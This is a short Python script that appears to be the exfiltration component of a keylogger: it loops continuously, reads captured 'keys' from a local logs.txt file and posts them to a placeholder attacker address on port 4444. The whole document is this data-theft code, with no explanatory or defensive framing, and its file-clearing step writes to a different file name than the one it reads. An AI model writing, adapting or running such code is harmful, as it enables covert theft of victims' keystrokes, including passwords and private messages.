import requests
import time

def send_logs(keys):
    data = requests.post('http://YOUR-IP-ADDRESS:4444/logs', json={"keys": keys})
    return data.status_code

while True:
  try:
   with open("logs.txt","r") as l:
    keys = l.readlines()
    
   send_logs(keys)

   with open("file.txt", "w") as f:
     pass
   time.sleep(0.1)
  except FileNotFoundError as e:
    time.sleep(0.1)